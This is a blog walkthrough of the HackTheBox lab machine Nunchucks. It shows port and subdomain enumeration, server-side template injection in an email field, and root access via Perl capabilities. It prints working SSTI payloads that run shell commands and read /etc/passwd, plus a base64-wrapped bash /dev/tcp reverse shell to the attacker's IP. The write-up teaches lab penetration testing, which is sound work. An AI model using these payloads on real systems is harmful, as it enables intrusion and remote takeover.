<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Nunchucks HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/nunchucks-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-12-28T17:38:35+00:00">December 28, 2022</time><time class="updated" datetime="2025-06-19T13:44:04+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Nunchucks is a Linux machine and is considered an easy box by the hack the box. On this box, we will begin with a basic port scan and move laterally based on the findings. Then we will enumerate HTTP services and hunt vulnerabilities present on the web page.  Laterally, we will exploit server-side template injection (SSTI) vulnerability to gain an initial foothold in the target system. Then we will exploit Perl capabilities to gain a root shell.</span></p>
<h3><span style="color: #800000;">Table of content</span></h3>
<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap TCP Port Scan</span></li>
<li><span style="color: #000000;">Web Page Enumeration</span></li>
<li><span style="color: #000000;">Directory Bruteforce</span></li>
<li><span style="color: #000000;">Vulnerability Assessment</span></li>
<li><span style="color: #000000;">Server-Side Template Injection Exploitation</span></li>
<li><span style="color: #000000;">User Flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Find Privilege Escalation Vectors</span></li>
<li><span style="color: #000000;">Escalate Privilege exploiting Perl capabilities</span></li>
<li><span style="color: #000000;">Root Flag</span></li>
</ul>
<p><span style="color: #000000;">Let’s exploit it step by step.</span></p>
<h3><span style="color: #800000;">Initial Access</span></h3>
<p><span style="color: #000000;">We are going to start the assessment with the normal TCP/IP port scanning.</span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Nmap TCP Port Scan</strong></span></span></h4>
<p><span style="color: #000000;">We begin with the port scan where we are using nmap to find out which ports are open and what services are running in the target host. Nmap is a popular port scanning tool that comes with Kali Linux. To perform port scan, we have used –<strong>sV</strong> and <strong>-an sC </strong>flag which performs a service version with default NSE scripts against the target machine.</span></p>
<p><span style="color: #000000;">Flags features:</span></p>
<p><span style="color: #000000;">-sV:  Attempts to determine the service version</span></p>
<p><span style="color: #000000;">-sC: Scans with default NSE scripts</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.129.30.114</pre>
<p><span style="color: #000000;">From the nmap scan, we have found there were only three ports open, which are port <strong>22,80</strong> and port <strong>443</strong>. As usual <strong>HTTP and HTTPS service</strong> is running on port 80 and 443 and <strong>SSH service </strong>is running on port 22.  HTTP and HTTPS service is used for Webhosting whereas SSH service is used for remote connection. We did not find any vulnerabilities on SSH version 8.2p1 and the possible attack we can perform against the SSH service at this stage is Bruteforce only which we might not need to do. Furthermore, it is hosted on <strong>nginx 1.18.0</strong>, and we can see that port HTTP is redirecting to HTTPS. Also, we found a domain name which is <strong>nunchucks.htb.</strong></span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTjqBREHNq9yK9uvxehPNaIgnLFDDp5RWuxT9blS4_Yo6HzcF8s0uXAzHo90-eizhN0-Kr2Ienqn4idiXlRYUehLZcOSVzXz_4v488rkK6BGKlkhSb88EUXimwbWYpnNMk7FRexUvv123mLgmPWAoVPboqEaRH7DB0M7q8WwLoDXQCJGQOwYkaWENjGQ/s16000/1.png"/></strong></span></p>
<p><span style="color: #000000;">We added<strong> nunchucks.htb </strong>to our /etc/host file for further analysis.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjZVJFqYRbnAzqXR-fRtskQqQKZ36FgkJ0YPdYFiCaR-2JDcYxPVcM6-ROIgApzzMsNnixqjQOv2fGotCVLf0oNcTstfIFMjA8LEfVFDocmYDcjltjoccMnQK_W_aeutqXfTbbk_JX7lqNtKq7N5cwt2Rt1adt0WvVd95t1P_a17k_rwFhb1uWdqxeNw/s16000/2.png"/></span></p>
<h4><span style="color: #000000;"><strong><span style="text-decoration: underline;">Web Page Enumeration</span> </strong></span></h4>
<p><span style="color: #000000;">We enumerate port 443 and access it over the browser showing an online shopping website which comes with eCommerce features. Nothing looks interesting here on the web page, so we decided to go with the subdomain fuzzing as we already have a target domain name.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMiDQtb_s-5WjlV0DchPEIHiHYkp3EOg_HF1Dg16Sq8rFvH0pUWil5XQZ2CqcUvm86bCKUFck6XRBA9CunOSh94DRIgQzE0x0ZClAlFkBL8j-eN1FS1rcUWsaj2VuVf7d83UFnoYh8RkavUglmSlXePsbfUl4T33t_OcCoZUGhMVUOZiPxaEHkRzcasg/s16000/3.png"/></strong></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Directory Bruteforce</strong></span></span></h4>
<p><span style="color: #000000;">We used wffuz tool to find any potential subdomains as the webpage is related to an online shop, there are high chances to find other subdomains which are working with the primary domain. Here we are using common wordlists and set <strong>–hw</strong> flag to hide responses with the specified words. If we do not use this flag, then we will get a lengthy output. Then we set the fuzzing point on the domain which comes before the domain name. As expected, we found a subdomain <strong>store.nunchucks.htb.</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wfuzz -c -w /usr/share/wordlists/dirb/common.txt -t30 --hw 2271 -H "Host:FUZZ.nunchucks.htb" https://nunchucks.htb/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0BpEobOUX-8xPexI-tbw1easpfA0eLjFGN1hhTV8z2m0WqnLaJbywHCypjGCb4KlgRrAzcIQAZrbe5vqBXbA1wLHgsquaR8up5SjSZ3diH42uAkaTabdrpFXlaAffidnI5_MtoFMCYQqkM5Yi2Gsc4XCxcge2UKyrC9KJRGp2XqLXy4ln6akFoE5xLQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Next, we added subdomain into the /etc/hosts file in our attacking machine to enumerate further. You can use any text editor to add domain to hosts file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCAFXnvmI_0hQbmsVbTxXwqthuL340uksm4TRDIiD64ySlCznHZDHK_4Ds2z4vvAO3M6ljfg9XJ04jmdixU2mDSR3A-sn_NQDra2u-SCmoFewELqEAGR01Ps5QuEVmGEU5Juv2SKdyn8VKPKnu0LNfCJ3yFIG-OoXC18Dk678tx1YOJTINd1HZicZbMA/s16000/6.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Vulnerability Assessment</strong></span></span></h4>
<p><span style="color: #000000;">After adding it to the hosts file, we accessed <strong>https://store.nunchucks.htb </strong>over the browser and we got a new web page. The webpage looks normal as other web pages. We checked the source code and all available pages but did not find anything interesting there. Then we went to the main page and saw a user input field which is made to receive notifications. If we give our email address in the “Your email here” field, then we will receive a notification from https://store.nunchucks.htb but we do not want that. Our primary goal is to find vulnerabilities here.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZoj6RUY5NAomZQSNN_VtSagSHQKY7uN5clLs-bxMWomQdO4bBQnzMAugjLyAngWlZKN2MqQQ6U4n3xcA7Bp_BKu-8yFe5HICCn-M8_cqbAyLoD-y0bI1T6ycZp2sTFV4YJxOeQ-k0-PFXC2f35pU3zbdDLYrQiGOcCkUfNjemzVRpcEcb1HLxOq7aZQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">We used a random email and captured the request to check how it works. We can see our email in the email field.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizG5iZO16oVhpe4pJpR1J1u7gy9jz5-TxAVmOVgFFnfywT5R3ZTLwTfdIo1mTiIU3sd_h4L84OEoSSofoKJIwDGc4TwJOGtoVL9JDtSGHkgGfXx4jLruZ-cx-ebhwyYBo0Ubf9jiiMdVSNqDKbPNxsPxMNI5gz55gbYVnLB7QYbZpHlhC9w6IvsX6BDA/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Then we decided to test Server-side Template Injection against the target system. To do that we sent the request to the repeater and then replaced the random email with SSTI payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">{{7*7}}</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOosjweRzY_SDn9BDkAah-8Vm-oBbi9g34ihUrZ0P4GySxz947QSMK15q0-JUybTUbknnYnc9nwGZsZw-fLhm7G4NDNWI1nPHFSA844DccXQfR9s3W3kNvjmr38_39_xjhi5Kgf6jARic9hvBc8fvk3Y7dpWEkcE9paYQyoVrA3sC4AbDeGNJIGBc0zQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">After sending a request to the webpage, we received a response as sum of the payload which is 49. If we get the sum of the given argument, then it is quite promising that server is vulnerable to SSTI. For example, we have given {{7*7}}in our payload and received 49 as sum of 7*7.</span></p>
<p><span style="color: #000000;"> A server-side template injection (SSTI) vulnerability <strong>occurs when user data is embedded directly in a template and then interpreted by the template engine</strong>. This allows attackers to inject arbitrary directives to manipulate the template engine.</span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Server-Side Template Injection (SSTI) Exploitation</strong></span></span></h4>
<p><span style="color: #000000;">Then we decided to check the users in the target system. The user file is available in the /etc/passwd file. SSTI works similarly to Local File inclusion vulnerability, but it has a different syntax which is available here:</span></p>
<p><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a></span></strong></p>
<p><span style="color: #000000;">We created a new payload to read /etc/passwd file from the target system and repeated the same process.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}}"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinPN7FfyIy77mwwhM_HJOX4PYt7-wxj84gy6mDzuO_QGBftaA9O8UeBprob2fLKqvmJZIsqTkZm92YtdqIO5-2DSnkMdC-1xTF67eXnUn7HaOhhxP3LyDZJr_-C54zBk63izxNaoZaFNcCHn_gWd9SSN2_1Ig72dCejZRhAEKFM9p-MEM-JDTgv2l6pQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">After crafting a new payload, we sent the request using burp repeater as we did it earlier. As expected, we got /etc/passwd contents in our response.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4AFtDZmQBQdjBhjSp9BxDfMxnYwe-lE1ScKvHLTLaLN5_GMUQehdh9SAxNqyi4tRfkOuzhT5wpxbrhwaBypWVN1XTbL7jFGS_gwvfYxGPB_Ifo8Na7nd1_KdOdH2gQxKjjhEngbcJZDWmqWzNGaBmXToYm1Mv-YdVQvsLajNf27787ZvDz5ZcQoeqFg/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Next, we decided to take a reverse shell of the target system by sending one-liner bash reverse shell. Most of the reverse shell is available on the pentestmonkey website:</span></p>
<p><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></span></strong></p>
<p><span style="color: #000000;">As many times hard coded reverse shell does not work properly so we are encoding it to base64.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.30/443 0&gt;&amp;1"' | base64</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvCqYkuwBHlqJhvei-oLfQhE9X04925RaHm1guH3dmepsLOw2qnKZvg3OSjosPpQ-nWazEJDX-HMgLGeOza0SYuG5UurtvLaI8vzvK4WjIp3WSBrS-595OalEFyBVYFggJpAlDw-BGzWg5-te9s0fJuer1sgccx34zK0_U6AipW8vmm31TEe7BLUqMtg/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Then we crafted our payload again and added our base64 encoded bash one-liner reverse shell and replace the new payload in the email field. Please note in the payload we issued -base64 -d flags, so when we send our encoded payload to the target system then it will decode it and execute with bash.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMC80NDMgMD4mMSIK | base64 -d | bash')\")()}}"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6CxjL7G5jrsthgjxPD3X8e-be9abgveMoQTjFhub6ZL9gx6CvS4Pujb-6ZNt_Xyi7FkzFrTIpqKZgvoyI3R8FvXBChWrS8RGyAuJ2Xro1ftEkc86iyJo-OnA52et7-Rh4aMTQzABeSoaj-9uFm3wcvPrK2RP4UMdAvLI9B_3r4B44DX_n2miANDWRoQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Once we replace the new payload then follow the same steps we did earlier while retrieving from the/etc/hosts file. Before sending it, let’s start Netcat listener in our kali system on port 443.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 443</pre>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>User Flag</strong></span></span></h4>
<p><span style="color: #000000;">After sending a request to the web server, we received a reverse shell as user <strong>david</strong> on port 443. We can grab our user flag from the david home directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home/david
cat user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6IaUTGDYLUt3zljllfRDfLCCumbHxum6vjgJ_pbUNWp7aI3mHvjWtbqYtsfaki7TWQBZ3XYasfNhrUX72QYdGvcZR_5dbtKBQpUcl3boFpNIEDJAYAQHqka296gbt2cVLVOshAgIC0HVI54lMAMYRuwWvBBQ73XhHrKIcOhr_0ggaNvdb0lJo4DFPTQ/s16000/15.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Privilege escalation is the process of exploiting a bug, design flaw or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. It can be used by attackers to gain access to more system functions and data than intended by the root user. In some cases, privilege escalation can allow attackers to gain complete control of the system.</span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Find Privilege Escalation Vectors</strong></span></span></h4>
<p><span style="color: #000000;">Next, we need to escalate to a privilege account, so we transferred <strong>linpeas.sh</strong> script to the target system /tmp directory as any user has full permission on this directory. To transfer linpeas.sh into the target system we have to setup a python server in the kali machine. Here we have set up python server on port 80, now we can download the script with <strong>wget</strong> from the target side.</span></p>
<p><span style="color: #000000;">In Kali:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -m http.server 80</pre>
<p><span style="color: #000000;">On Target:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
wget 10.10.14.30/linpeas.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUwXBZZdKtlJErd8EJXOIHMfZ1UZohbSamhYlCFdTwjgCJYPLEZ4wgESHfEnTuDeLOPXdiUYSBife_AuqZ2qgklvGYXNs5PtQish-gkJphkuiYPh16uaQRcUmiQhYA-s-Z1NhALoIlCESGmJEz047D251Vh5LcybXZfprfhb4ENnxWd_YoFBQZghamqw/s16000/16.png"/></span></p>
<p><span style="color: #000000;">Once it is downloaded in the target system, we will give full permission to the linpeas.sh and execute it. Script will enumerate possible privilege escalation vectors present in the target system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod  777 linpeas.sh
./linpeas.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEho4jx31BgNVBqdG-f1BGvbNfnHVKg3pw2KrcVvc1zSmfuYKp5mi7CAiCFNAEHXmwjGUpv5fcOs7DlIYdv0v92J7hmBUzAI8NkOJMJWGbDmRLjxULLormNK4c4OEJhfsT1B7wQx_tDMG5DmG9l_-dA0QF1sqrNxQUnbShxWR2KBpRM_0BSutkK_YBHAwQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">From the linpeas.sh out we found that Perl has special capabilities which can lead an attack to gain high privileged shell which is root shell. Please note, if linpeas output is highlighting red and yellow in both area then that could be promising to gain root access in the target system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCBe0bdw3-YLetGLovGU6FhALdCeppjLNcXkHcl5Xqc3pvPw-L51Q_kb_duZvjeggbOuT3m_CU5dosInFmaalShH7LMCKI2nQUP-CZm92IDi5lQ-8lT0y0Ocjclel1vqifWfkb2r3xOM-Rt1PKvBQV4dJ5JoL8w7AyPHQO-S1gMigr4bhC7UDTSZEPDg/s16000/18.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Escalate Privilege via Perl capabilities</strong></span></span></h4>
<p><span style="color: #000000;">We have got an insight into the potential exploit so started checking blogs and techniques on google. We found there is an article available in the “Hacking articles” about exploiting Perl to gain a root shell. Referencing the article, we created a bash script and saved it as <strong>test.sh</strong> in our kali machine and sent it to the target system as we transferred the file earlier in linpeas.sh case.</span></p>
<p><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/</a></span></strong></p>
<p><span style="color: #000000;">In Kali:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -m http.server 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5Upr4dy5J9YzCHrPK0vb-YoVaVgbjB9ZyUSuo80yLTnQFk0q5UxGoz4vDRfPsh7Ed1lfRx5gzYDn9FqAftuIBzIMMYhdqjA4dbuhFdv2Ia_GtZdzTjKA3S45GvkFwAdJKhPZaJrsN5Hr1HpWkgD9x0O_YtU0WPiyqG9DyP4dRIcRNdrKiSx5OpeuFmQ/s16000/19.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Root Flag</strong></span></span></h4>
<p><span style="color: #000000;">We download test.sh script on the target /tmp directory and give full permission. Execution of the script spawned a root shell. Now we can grab our root flag from the /root directory.</span></p>
<p><span style="color: #000000;">On Target:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
wget 10.10.14.30/test.sh 
chmod  777 test.sh
./test.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYwvupvfX7Q8K8BV1wYuPK14kIR1t8I7Sbyq88PsyGLJHmynPyrV2AaYp2B7sRqW2ltjIeIyTuhv7buo6QjPS0UaReNkbBcb_8dVuv_zhARhvRbhRKvj-cZqP2e8zNeVIsyOazJA3563hg3T8SYydr0nVDGm3BfGQjVvSQB2rw7s8lMT7cABYMRGA7kw/s16000/20.png"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">This machine was fun and was a great source of learning, where we learned and explored so many things such as TCP port scan, service enumeration, Server-Side Template Injection vulnerability assessment and exploitation, file transfer, special capabilities, and performed privilege escalation by exploiting Perl capabilities.</span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and loves to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact here<strong>: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://au.linkedin.com/in/subhash-paudel-a021ab207">Linkedin</a> </span></strong>and</span> <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/subhashpaudel94">Twitter</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
